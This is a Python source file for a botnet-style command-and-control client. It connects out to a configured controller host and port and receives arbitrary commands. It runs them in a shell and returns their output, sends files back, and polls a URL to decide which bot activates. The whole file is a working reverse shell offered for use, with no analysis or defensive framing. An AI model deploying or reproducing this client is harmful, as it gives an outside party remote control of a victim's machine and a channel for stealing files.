#! /usr/bin/env python3

import modules, urllib.request, time, socket, subprocess, os


botname = ''			# Put name of bot here
host = '192.168.0.16'		# Put controller IP here
port = 2828				# Put controller listening port here
connections = {
	'source':'',		# Put URL for update here. Leave blank for manual only.
	'instruction':'manual'	# Put url for currently active device here. if source is set to 'manual', the bot will automatially start.
}

if connections['instruction'] == 'manual':
	ACTIVE = 'manual'
else:
	ACTIVE = ( urllib.request.urlopen(connections['instruction']).read() == botname ) # finds if instruction matches current bot

# connection ============================================= #
def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print( "[CCCli] Attempting to connect to {} on port {} ...".format(host, port) )
	s.connect((host, port))
	print( "[CCCli] Controller accepted connection." )

	while True: 
		command = s.recv(1024).decode()

		if '==terminate' in command:
			try:
				print( "[CCCli] Controller terminated connection." )
				s.close()
			except ConnectionResetError as e:
				if e.errno != errno.ECONNRESET:
					raise # Not error we are looking for
				pass # Handle error here.
			break
		elif '==transfer' in command: # we use 'in' here since there will be more arguments.
			cmd,path = command.split('*')

			try:
				modules.transfer(s,path)
			except Exception as e:
				s.send ( str(e) ) # send the exception error
				pass
		elif command.split(' ')[0] == 'cd':
			os.chdir(
				command.split(' ')[1]
			)
		else:
			CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			s.send( CMD.stdout.read() ) 
			s.send( CMD.stderr.read() )

	return
# ======================================================== #

while True: # Tests for instruction every 10 seconds.
	time.sleep(5)
	if ACTIVE == False:
		if connections['instruction'] != 'manual':
			ACTIVE = ( urllib.request.urlopen(connections['instruction']).read() == botname )
		continue
	elif ( ACTIVE == True ) or ( ACTIVE == 'manual' ):
		try:
			connect()
		except ConnectionError as e:
			pass